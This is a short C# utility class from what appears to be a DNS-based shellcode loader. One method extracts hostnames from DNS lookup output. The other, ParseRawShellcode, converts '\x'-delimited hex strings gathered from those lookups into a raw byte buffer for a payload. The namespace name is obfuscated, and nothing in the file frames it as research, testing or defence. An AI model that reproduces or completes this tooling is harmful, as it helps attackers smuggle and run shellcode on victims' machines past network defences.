using System;

namespace RArAtiTdkA;
using System.Collections;
public class Util
{
    private static string PREFIX = "DNS request timed out.";


    public static string ParseHostnameFromString(string parses)
    {
        if (!parses.Contains("Name")) return null;
        string[] splitter = parses.Split(new string[] { "Name" }, StringSplitOptions.None);
        string[] name = splitter[1].Split(new string[] { ".com" }, StringSplitOptions.None);
        string final = name[0].Replace(":", "").Replace(" ", "");
        return final;
    }

    public static byte[] ParseRawShellcode(ArrayList shelcode)
    {
        string DATA = string.Join("", shelcode.ToArray());
        string[] Payload__Without_delimiterChar = DATA.Split('x');
        object tmp = new object();
        byte[] buffer = new byte[DATA.Length / 4];
        int counter = 0;
        for (int i = 1; i < buffer.Length+1; i++)
        {
            tmp = Payload__Without_delimiterChar[i].ToString().Substring(0, 2);
            byte current = Convert.ToByte("0x" + tmp.ToString(), 16);
            buffer[counter] = current;
            counter++;
        }

        return buffer;
    }
}